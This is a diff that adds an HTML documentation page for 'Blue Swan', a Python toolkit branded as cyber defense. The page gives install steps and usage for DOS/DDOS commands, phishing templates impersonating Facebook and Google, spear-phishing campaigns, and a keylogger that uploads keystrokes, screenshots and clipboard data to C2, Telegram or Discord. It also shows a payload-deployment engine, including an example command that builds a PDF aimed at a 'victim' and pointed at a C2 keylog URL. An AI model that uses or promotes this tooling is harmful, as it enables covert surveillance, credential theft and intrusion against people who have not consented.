@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>🦢 BLUE SWAN · Documentation</title>
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    /* ===== DEEP BLUE THEME with orange, yellow, purple, red accents ===== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+      background: #0b0e1a;
+      color: #e8edf5;
+      line-height: 1.6;
+      padding: 2rem 1.5rem;
+    }
+
+    .container {
+      max-width: 1300px;
+      margin: 0 auto;
+      background: linear-gradient(145deg, #12162a 0%, #0d1122 100%);
+      border-radius: 2.5rem;
+      padding: 2.5rem 2.2rem;
+      box-shadow: 0 20px 60px rgba(0, 20, 80, 0.7);
+      border: 1px solid rgba(30, 80, 200, 0.2);
+    }
+
+    /* header with blue swan */
+    .header {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 2.5rem;
+      border-bottom: 2px solid #1e3b7a;
+      padding-bottom: 1.2rem;
+    }
+
+    .logo h1 {
+      font-size: 2.6rem;
+      font-weight: 700;
+      background: linear-gradient(135deg, #5b9aff, #a78bfa, #facc15);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      display: inline-block;
+      letter-spacing: 1px;
+    }
+    .logo span {
+      font-size: 1.8rem;
+      -webkit-text-fill-color: initial;
+      color: #facc15;
+    }
+    .logo small {
+      display: block;
+      font-size: 0.8rem;
+      color: #7b92c7;
+      letter-spacing: 4px;
+      -webkit-text-fill-color: initial;
+      color: #8ba0d9;
+      margin-top: 4px;
+    }
+
+    .badge-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.8rem;
+    }
+    .badge {
+      background: #1b2648;
+      padding: 0.4rem 1.2rem;
+      border-radius: 60px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      border: 1px solid #2f4b8a;
+      color: #b7cdff;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .badge i {
+      color: #facc15;
+    }
+    .badge.orange { border-color: #f97316; color: #fdba74; }
+    .badge.purple { border-color: #8b5cf6; color: #c4b5fd; }
+    .badge.red { border-color: #ef4444; color: #fca5a5; }
+
+    /* theme accent bar */
+    .theme-bar {
+      display: flex;
+      gap: 0.6rem;
+      margin: 1.8rem 0 2rem;
+      flex-wrap: wrap;
+    }
+    .theme-swatch {
+      width: 40px;
+      height: 10px;
+      border-radius: 40px;
+      background: #1a4b9c;
+    }
+    .theme-swatch.orange { background: #f97316; }
+    .theme-swatch.yellow { background: #facc15; }
+    .theme-swatch.purple { background: #8b5cf6; }
+    .theme-swatch.red { background: #ef4444; }
+    .theme-swatch.deep { background: #0b1a3a; border: 1px solid #3a6bc4; }
+
+    /* documentation grid */
+    .doc-grid {
+      display: grid;
+      grid-template-columns: 1fr 2.2fr;
+      gap: 2.5rem;
+      margin-top: 1.2rem;
+    }
+
+    /* sidebar navigation */
+    .sidebar {
+      background: #111b35;
+      border-radius: 1.8rem;
+      padding: 1.8rem 1.2rem;
+      border: 1px solid #253b6e;
+      box-shadow: inset 0 0 30px rgba(0, 30, 80, 0.4);
+      height: fit-content;
+      position: sticky;
+      top: 1.5rem;
+    }
+    .sidebar h3 {
+      font-size: 0.8rem;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      color: #6f8ec9;
+      margin-bottom: 1.5rem;
+      border-bottom: 1px solid #1f3560;
+      padding-bottom: 0.8rem;
+    }
+    .sidebar ul {
+      list-style: none;
+    }
+    .sidebar li {
+      margin-bottom: 0.4rem;
+    }
+    .sidebar a {
+      color: #b7ceff;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 0.6rem 1rem;
+      border-radius: 14px;
+      transition: all 0.2s;
+      font-size: 0.9rem;
+      font-weight: 450;
+      border-left: 2px solid transparent;
+    }
+    .sidebar a i {
+      width: 22px;
+      color: #5b8ef0;
+      font-size: 1rem;
+    }
+    .sidebar a:hover {
+      background: #1d2d57;
+      border-left-color: #facc15;
+      color: white;
+      transform: translateX(4px);
+    }
+    .sidebar a.active {
+      background: #1f3261;
+      border-left-color: #f97316;
+      color: white;
+      font-weight: 600;
+    }
+    .sidebar a.active i {
+      color: #facc15;
+    }
+
+    /* main content */
+    .main-content {
+      background: #0f162e;
+      border-radius: 1.8rem;
+      padding: 1.8rem 2rem;
+      border: 1px solid #1f3a6b;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+
+    .main-content h2 {
+      font-size: 2rem;
+      font-weight: 600;
+      background: linear-gradient(135deg, #6d9eff, #b794f4);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin-bottom: 0.5rem;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .main-content h2 i {
+      -webkit-text-fill-color: initial;
+      color: #facc15;
+    }
+    .main-content .subhead {
+      color: #7f99d0;
+      border-left: 3px solid #f97316;
+      padding-left: 1.2rem;
+      margin-bottom: 2rem;
+      font-size: 0.95rem;
+    }
+
+    .step-card {
+      background: #111d3b;
+      border-radius: 1.2rem;
+      padding: 1.8rem 1.8rem;
+      margin-bottom: 1.8rem;
+      border-left: 6px solid #2b5bc4;
+      transition: 0.2s;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+    .step-card.orange { border-left-color: #f97316; }
+    .step-card.yellow { border-left-color: #facc15; }
+    .step-card.purple { border-left-color: #8b5cf6; }
+    .step-card.red { border-left-color: #ef4444; }
+    .step-card.deep { border-left-color: #1f4b9e; }
+
+    .step-card h3 {
+      color: #e0ecff;
+      font-size: 1.2rem;
+      margin-bottom: 0.6rem;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .step-card h3 i {
+      color: #facc15;
+      font-size: 1.1rem;
+    }
+    .step-card p, .step-card li {
+      color: #c5d4f0;
+    }
+    .step-card code, .code-block {
+      background: #0b101f;
+      padding: 0.2rem 0.8rem;
+      border-radius: 12px;
+      font-family: 'Fira Code', 'JetBrains Mono', monospace;
+      font-size: 0.85rem;
+      color: #facc15;
+      border: 1px solid #2c4680;
+    }
+    .code-block {
+      display: block;
+      padding: 1.2rem 1.5rem;
+      margin: 0.8rem 0;
+      overflow-x: auto;
+      background: #060b17;
+      border-left: 4px solid #f97316;
+      color: #b7d0ff;
+    }
+    .code-block .cmd {
+      color: #facc15;
+      font-weight: 500;
+    }
+    .code-block .comment {
+      color: #5f7caf;
+    }
+
+    .icon-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1rem 1.8rem;
+      margin: 1rem 0;
+    }
+    .icon-list i {
+      color: #facc15;
+      margin-right: 6px;
+    }
+
+    .platform-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+      gap: 0.8rem;
+      margin: 1rem 0;
+    }
+    .platform-tag {
+      background: #16234a;
+      border-radius: 40px;
+      padding: 0.4rem 1rem;
+      text-align: center;
+      font-size: 0.8rem;
+      border: 1px solid #2a4680;
+      color: #b2c9ff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .platform-tag i {
+      color: #facc15;
+    }
+
+    hr {
+      border: 0;
+      height: 1px;
+      background: linear-gradient(90deg, #1a3366, #3a5f9e, #1a3366);
+      margin: 2rem 0;
+    }
+
+    .footer {
+      margin-top: 2.5rem;
+      text-align: center;
+      font-size: 0.85rem;
+      color: #5773a6;
+      border-top: 1px solid #1b2e58;
+      padding-top: 1.8rem;
+      letter-spacing: 0.4px;
+    }
+    .footer i {
+      color: #facc15;
+    }
+
+    /* responsiveness */
+    @media (max-width: 850px) {
+      .doc-grid {
+        grid-template-columns: 1fr;
+      }
+      .sidebar {
+        position: static;
+      }
+      .container {
+        padding: 1.5rem;
+      }
+      .logo h1 {
+        font-size: 2rem;
+      }
+      .badge-group {
+        margin-top: 0.8rem;
+      }
+    }
+    @media (max-width: 480px) {
+      body { padding: 0.8rem; }
+      .container { padding: 1.2rem; border-radius: 1.8rem; }
+      .main-content { padding: 1.2rem; }
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="logo">
+      <h1>🦢 BLUE <span>SWAN</span></h1>
+      <small>v1.0.0 · ACCURATE CYBER DEFENSE</small>
+    </div>
+    <div class="badge-group">
+      <span class="badge"><i class="fas fa-code"></i> Python 3.7+</span>
+      <span class="badge orange"><i class="fas fa-robot"></i> 210+ commands</span>
+      <span class="badge purple"><i class="fas fa-shield-alt"></i> IP blockchain</span>
+      <span class="badge red"><i class="fas fa-skull"></i> DOS / C2</span>
+    </div>
+  </div>
+
+  <!-- theme accent bar -->
+  <div class="theme-bar">
+    <span class="theme-swatch"></span>
+    <span class="theme-swatch orange"></span>
+    <span class="theme-swatch yellow"></span>
+    <span class="theme-swatch purple"></span>
+    <span class="theme-swatch red"></span>
+    <span class="theme-swatch deep"></span>
+    <span style="color:#6f8ec9; font-size:0.7rem; margin-left:10px; align-self:center;">
+      <i class="fas fa-palette"></i> deep blue · orange · yellow · purple · red
+    </span>
+  </div>
+
+  <!-- DOCUMENTATION GRID -->
+  <div class="doc-grid">
+
+    <!-- SIDEBAR -->
+    <aside class="sidebar">
+      <h3><i class="fas fa-compass" style="color:#facc15;"></i> navigation</h3>
+      <ul>
+        <li><a href="#intro" class="active"><i class="fas fa-home"></i> Introduction</a></li>
+        <li><a href="#install"><i class="fas fa-terminal"></i> Installation</a></li>
+        <li><a href="#quickstart"><i class="fas fa-rocket"></i> Quick start</a></li>
+        <li><a href="#commands"><i class="fas fa-list-ul"></i> Command overview</a></li>
+        <li><a href="#platforms"><i class="fas fa-comment-dots"></i> Platform bots</a></li>
+        <li><a href="#keylogger"><i class="fas fa-keyboard"></i> Keylogger</a></li>
+        <li><a href="#deploy"><i class="fas fa-upload"></i> Deployment</a></li>
+        <li><a href="#monitor"><i class="fas fa-eye"></i> IP monitor</a></li>
+        <li><a href="#web"><i class="fas fa-globe"></i> Web dashboard</a></li>
+      </ul>
+      <div style="margin-top:2rem; background:#0b162a; border-radius:1.2rem; padding:1rem; border:1px solid #253f75;">
+        <p style="font-size:0.75rem; color:#859fd4;"><i class="fas fa-shield-halved" style="color:#facc15;"></i> Author: Ian Carter Kulani</p>
+        <p style="font-size:0.7rem; color:#4d6fa8;">🦢 Blue Swan v1.0.0</p>
+      </div>
+    </aside>
+
+    <!-- MAIN CONTENT -->
+    <main class="main-content" id="intro">
+      <h2><i class="fas fa-feather"></i> Blue Swan Documentation</h2>
+      <div class="subhead">
+        <i class="fas fa-bolt" style="color:#facc15;"></i> cybersecurity C2 · 210+ commands · multi‑platform
+      </div>
+
+      <!-- ===== INTRODUCTION ===== -->
+      <div class="step-card deep">
+        <h3><i class="fas fa-info-circle"></i> What is Blue Swan?</h3>
+        <p>Blue Swan is a complete cybersecurity automation platform built in Python. It combines <strong>network scanning, traffic generation, social engineering, spear phishing, advanced keylogging, DOS/DDOS, agent C2, IP blockchain, and real‑time monitoring</strong> — all accessible from a beautiful web dashboard and popular messaging platforms.</p>
+        <div class="icon-list">
+          <span><i class="fas fa-check-circle"></i> 210+ security commands</span>
+          <span><i class="fas fa-check-circle"></i> Discord · Telegram · Slack</span>
+          <span><i class="fas fa-check-circle"></i> Signal · iMessage · WhatsApp</span>
+          <span><i class="fas fa-check-circle"></i> Google Chat · Web</span>
+        </div>
+      </div>
+
+      <!-- ===== INSTALLATION ===== -->
+      <div id="install" class="step-card orange">
+        <h3><i class="fas fa-download"></i> Step‑by‑step installation</h3>
+        <p><strong>1. Clone &amp; enter the repository</strong></p>
+        <div class="code-block">git clone https://github.com/Iankulani/blue_swan.git<br/>cd blue_swan</div>
+
+        <p><strong>2. Create virtual environment (recommended)</strong></p>
+        <div class="code-block">python3 -m venv venv<br/>source venv/bin/activate  <span class="comment"># Linux/macOS</span><br/>venv\Scripts\activate     <span class="comment"># Windows</span></div>
+
+        <p><strong>3. Install core dependencies</strong></p>
+        <div class="code-block">pip install --upgrade pip<br/>pip install -r requirements.txt</div>
+
+        <p><strong>4. Install optional extras (for full functionality)</strong></p>
+        <div class="code-block"><span class="comment"># keylogger, traffic gen, phishing, bots, web, graphics</span><br/>pip install pynput scapy flask discord.py telethon slack-sdk pywhatkit reportlab matplotlib seaborn dnspython pyshorteners whois qrcode beautifulsoup4</div>
+
+        <p><strong>5. Run Blue Swan</strong></p>
+        <div class="code-block">python blue_swan.py</div>
+        <p style="margin-top:0.5rem;"><i class="fas fa-shield" style="color:#f97316;"></i> <strong>Pro tip:</strong> run with <code>sudo</code> or as admin for raw socket / firewall features.</p>
+      </div>
+
+      <!-- ===== QUICK START ===== -->
+      <div id="quickstart" class="step-card yellow">
+        <h3><i class="fas fa-play"></i> Quick start</h3>
+        <p>After installation, the interactive terminal opens. Type <code>help</code> to list all commands.</p>
+        <div class="code-block"><span class="cmd">🦢> help</span><br/>  <span class="comment"># shows the full command reference</span><br/><span class="cmd">🦢> ping 8.8.8.8</span><br/>  <span class="comment"># test connectivity</span><br/><span class="cmd">🦢> nmap_quick 192.168.1.0/24</span><br/><span class="cmd">🦢> traffic icmp 10.0.0.1 20</span><br/><span class="cmd">🦢> keylogger_start</span><br/><span class="cmd">🦢> web_start 5000</span>  <span class="comment"># launch dashboard</span></div>
+        <p><i class="fas fa-lightbulb" style="color:#facc15;"></i> The web dashboard runs at <code>http://localhost:5000</code> with real‑time stats, IP monitoring, and command execution.</p>
+      </div>
+
+      <!-- ===== COMMANDS OVERVIEW ===== -->
+      <div id="commands" class="step-card purple">
+        <h3><i class="fas fa-terminal"></i> Command overview</h3>
+        <p>Blue Swan groups commands into families:</p>
+        <ul style="margin:0.8rem 0 0 1.2rem; list-style-type:square; color:#b7cdff;">
+          <li><strong>ping, nmap, curl, netcat, traceroute</strong> – network recon</li>
+          <li><strong>ssh_add, ssh_exec, ssh_list</strong> – remote SSH control</li>
+          <li><strong>traffic, nikto, dos_*</strong> – traffic gen, web vuln scanning, DOS attacks</li>
+          <li><strong>phish_*</strong> – 30+ social engineering templates (Facebook, Google, etc.)</li>
+          <li><strong>spear_create, spear_send</strong> – spear‑phishing campaigns</li>
+          <li><strong>keylogger_start, keylogger_logs</strong> – advanced keylogger with exfil</li>
+          <li><strong>deploy_pdf, deploy_email, deploy_link</strong> – payload delivery</li>
+          <li><strong>monitor_add, monitor_list, monitor_blockchain</strong> – IP monitoring &amp; blockchain</li>
+          <li><strong>ip_to_domain, domain_to_ip, host_domain</strong> – domain hosting engine</li>
+        </ul>
+        <div class="code-block" style="margin-top:1rem;"><span class="cmd">🦢> help</span>  <span class="comment"># full command reference</span></div>
+      </div>
+
+      <!-- ===== PLATFORM BOTS ===== -->
+      <div id="platforms" class="step-card deep">
+        <h3><i class="fas fa-comment-dots"></i> Platform integration</h3>
+        <p>Blue Swan connects to <strong>Discord, Telegram, Slack, Signal, iMessage, WhatsApp, Google Chat</strong> and the <strong>web</strong>.</p>
+        <div class="platform-grid">
+          <span class="platform-tag"><i class="fab fa-discord"></i> Discord</span>
+          <span class="platform-tag"><i class="fab fa-telegram"></i> Telegram</span>
+          <span class="platform-tag"><i class="fab fa-slack"></i> Slack</span>
+          <span class="platform-tag"><i class="fas fa-message"></i> Signal</span>
+          <span class="platform-tag"><i class="fas fa-comment"></i> iMessage</span>
+          <span class="platform-tag"><i class="fab fa-whatsapp"></i> WhatsApp</span>
+          <span class="platform-tag"><i class="fas fa-hashtag"></i> Google Chat</span>
+          <span class="platform-tag"><i class="fas fa-globe"></i> Web</span>
+        </div>
+        <p style="margin-top:0.8rem;">Configure any platform during startup or via <code>config</code> files. Commands executed from any platform are logged centrally.</p>
+        <div class="code-block"><span class="cmd">🦢> # Discord example</span><br/>  <span class="comment">(configure token &amp; channel, then use !ping 8.8.8.8)</span></div>
+      </div>
+
+      <!-- ===== KEYLOGGER ===== -->
+      <div id="keylogger" class="step-card red">
+        <h3><i class="fas fa-keyboard"></i> Advanced keylogger</h3>
+        <p>Full‑featured keylogger with <strong>screenshots, clipboard capture, and exfiltration</strong> via file, email, C2, Telegram, Discord.</p>
+        <ul style="margin:0.5rem 0 0 1.2rem; color:#b7cdff;">
+          <li><code>keylogger_start</code> – start logging (hotkey F10 to stop)</li>
+          <li><code>keylogger_logs</code> – view captured keystrokes</li>
+          <li><code>keylogger_screenshots</code> – list captured screenshots</li>
+          <li><code>keylogger_clipboard</code> – clipboard history</li>
+        </ul>
+        <div class="code-block" style="margin-top:0.6rem;"><span class="cmd">🦢> keylogger_start</span><br/>✅ Advanced Keylogger started<br/>  • Press F10 to stop<br/>  • Screenshot interval: 60s<br/>  • Upload interval: 30s</div>
+      </div>
+
+      <!-- ===== DEPLOYMENT ===== -->
+      <div id="deploy" class="step-card orange">
+        <h3><i class="fas fa-upload"></i> Deployment engine</h3>
+        <p>Generate payloads that deliver the keylogger or C2 agents via <strong>PDF, email, link, or executable</strong>.</p>
+        <div class="code-block"><span class="cmd">🦢> deploy_pdf "Invoice" "victim@email.com" "http://c2-server/keylog"</span><br/>✅ PDF deployment created: a1b2c3d4<br/>File: .blue_swan/deployments/a1b2c3d4.pdf</div>
+        <ul style="margin:0.5rem 0 0 1.2rem; color:#b7cdff;">
+          <li><code>deploy_email</code> – HTML email with tracking</li>
+          <li><code>deploy_link</code> – shortened link payload</li>
+          <li><code>deploy_executable</code> – stager executable</li>
+          <li><code>deploy_list</code> – track all deployments</li>
+        </ul>
+      </div>
+
+      <!-- ===== IP MONITOR ===== -->
+      <div id="monitor" class="step-card purple">
+        <h3><i class="fas fa-eye"></i> IP monitor &amp; blockchain</h3>
+        <p>Monitor up to <strong>10,000 IPs</strong> with real‑time port scanning, threat detection, and an <strong>immutable blockchain</strong> that logs every scan and action.</p>
+        <div class="code-block"><span class="cmd">🦢> monitor_add 192.168.1.100 "Suspicious host"</span><br/><span class="cmd">🦢> monitor_status 192.168.1.100</span><br/><span class="cmd">🦢> blockchain_info</span><br/>🔗 Blockchain Information<br/>  Chain Length: 342<br/>  Difficulty: 4</div>
+        <ul style="margin:0.5rem 0 0 1.2rem; color:#b7cdff;">
+          <li><code>monitor_list</code> – show all monitored IPs</li>
+          <li><code>monitor_scan</code> – trigger immediate scan</li>
+          <li><code>monitor_blockchain</code> – view IP blockchain history</li>
+          <li><code>monitor_verify</code> – verify chain integrity</li>
+        </ul>
+      </div>
+
+      <!-- ===== WEB DASHBOARD ===== -->
+      <div id="web" class="step-card deep">
+        <h3><i class="fas fa-globe"></i> Web dashboard</h3>
+        <p>Beautiful real‑time dashboard with <strong>live command output, IP monitoring, threat alerts, and graphical charts</strong>.</p>
+        <div class="code-block"><span class="cmd">🦢> web_start 5000</span><br/>✅ Web dashboard running at http://0.0.0.0:5000</div>
+        <ul style="margin:0.5rem 0 0 1.2rem; color:#b7cdff;">
+          <li>Execute commands directly from the browser</li>
+          <li>View monitored IPs with open/closed ports</li>
+          <li>Real‑time alert feed and performance charts</li>
+        </ul>
+        <p style="margin-top:0.8rem;"><i class="fas fa-qrcode" style="color:#facc15;"></i> Access via any device on your network.</p>
+      </div>
+
+      <hr />
+
+      <!-- ===== FOOTER NOTE ===== -->
+      <div style="display:flex; flex-wrap:wrap; gap:1.2rem; justify-content:space-between; align-items:center;">
+        <div style="display:flex; gap:0.8rem; flex-wrap:wrap;">
+          <span class="badge" style="background:#1d2d57;"><i class="fas fa-robot"></i> 210+ commands</span>
+          <span class="badge orange"><i class="fas fa-code-branch"></i> IP blockchain</span>
+          <span class="badge purple"><i class="fas fa-shield"></i> DOS / C2</span>
+        </div>
+        <div style="color:#607bb0; font-size:0.8rem;">
+          <i class="fas fa-book-open" style="color:#facc15;"></i> Full documentation: <code style="background:#0f1a34; padding:0.1rem 0.8rem; border-radius:40px;">docs.blue-swan.io</code>
+        </div>
+      </div>
+
+      <div class="footer">
+        <i class="fas fa-feather"></i> Blue Swan v1.0.0 · Author: Ian Carter Kulani<br/>
+        <span style="display:inline-block; margin-top:0.4rem; gap:0.6rem; letter-spacing:1px;">
+          <i class="fas fa-circle" style="color:#f97316; font-size:0.4rem;"></i> 
+          <i class="fas fa-circle" style="color:#facc15; font-size:0.4rem;"></i> 
+          <i class="fas fa-circle" style="color:#8b5cf6; font-size:0.4rem;"></i> 
+          <i class="fas fa-circle" style="color:#ef4444; font-size:0.4rem;"></i> 
+          <i class="fas fa-circle" style="color:#3b7bdd; font-size:0.4rem;"></i> 
+          <span style="color:#3a5f9e;">deep blue · orange · yellow · purple · red</span>
+        </span>
+      </div>
+    </main>
+  </div>
+</div>
+
+<!-- smooth scroll + active nav (minimal) -->
+<script>
+  (function() {
+    const links = document.querySelectorAll('.sidebar a');
+    const sections = document.querySelectorAll('.step-card, .main-content h2, .subhead, .main-content > div');
+    
+    function removeActive() {
+      links.forEach(l => l.classList.remove('active'));
+    }
+    function setActive(id) {
+      removeActive();
+      links.forEach(link => {
+        if (link.getAttribute('href') === '#' + id) {
+          link.classList.add('active');
+        }
+      });
+    }
+    
+    // simple click handler
+    links.forEach(link => {
+      link.addEventListener('click', function(e) {
+        const targetId = this.getAttribute('href').substring(1);
+        const target = document.getElementById(targetId);
+        if (target) {
+          e.preventDefault();
+          target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+          setActive(targetId);
+        }
+      });
+    });
+    
+    // highlight on scroll
+    let scrollTimeout;
+    window.addEventListener('scroll', function() {
+      clearTimeout(scrollTimeout);
+      scrollTimeout = setTimeout(() => {
+        let currentId = '';
+        const scrollPos = window.scrollY + 120;
+        document.querySelectorAll('.step-card, .main-content h2').forEach(el => {
+          const rect = el.getBoundingClientRect();
+          if (rect.top <= 180) {
+            const id = el.id || el.parentElement?.id;
+            if (id) currentId = id;
+          }
+        });
+        if (currentId) setActive(currentId);
+      }, 80);
+    });
+  })();
+</script>
+</body>
+</html>
